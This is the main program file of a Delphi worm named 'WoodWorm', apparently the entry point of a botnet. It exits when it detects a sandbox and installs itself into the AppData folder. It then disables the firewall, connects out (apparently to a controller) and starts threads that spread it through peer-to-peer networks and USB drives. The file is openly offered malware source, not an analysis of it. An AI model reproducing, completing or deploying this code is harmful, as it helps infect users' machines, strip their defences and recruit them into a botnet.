program WoodWorm;


uses
  Windows,
  ApplicationUnit,
  SocketUnit,
  StrList,
  KOL,
  ThreadUnit,
  Winsock2,
  functions,
  ThreadProcs,
  Bot,
  //polyengine,
  strings;

  var i : Integer;




begin
// DECRYPT;
 //if strings.Decrypted = FALSE then DECRYPT;
 If IsInSandBox = True then ExitProcess(0)
 else begin
 GetPath := GetAppDataPath + bot_installname;
 {$IFNDEF NOINSTALL}
 StartInstallThread(0);
 {$ENDIF NOINSTALL}
 Close_Firewall;
 Mutex := CreateMutex(nil, True, PChar(bot_mutexname));
 if (Mutex = 0) or (GetLastError = ERROR_ALREADY_EXISTS) then ExitProcess(0);
 Application := TApplication.Create;
 Running := True;
 MSNVAR := 0;
 TThread.Create(@CreateConnection, 0);
 for i := 1 to 9 do begin
   ThreadProcs.StartP2PThread(P2PNames[i]);
   Sleep(200);
 end;
 
 ThreadProcs.Spread := TRUE;
 ThreadProcs.StartUSBThread;
 Running := TRUE;
 while Running = True do
 begin
  Sleep(1);
  Application.ProcessMessages;
 end;
end;
end.


